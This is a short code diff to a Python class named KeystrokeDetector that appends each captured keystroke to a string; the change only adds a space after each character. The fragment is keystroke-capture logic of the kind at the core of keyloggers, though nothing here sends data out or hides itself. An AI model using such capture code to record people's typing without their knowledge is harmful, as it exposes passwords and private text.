@@ -9,7 +9,7 @@ class KeystrokeDetector:
         if not self.hooked:
             return False
         try:
-            self.keys += key.char
+            self.keys += key.char + ' '
         except AttributeError:
             self.keys += (' ' + format(key) + ' ')
 
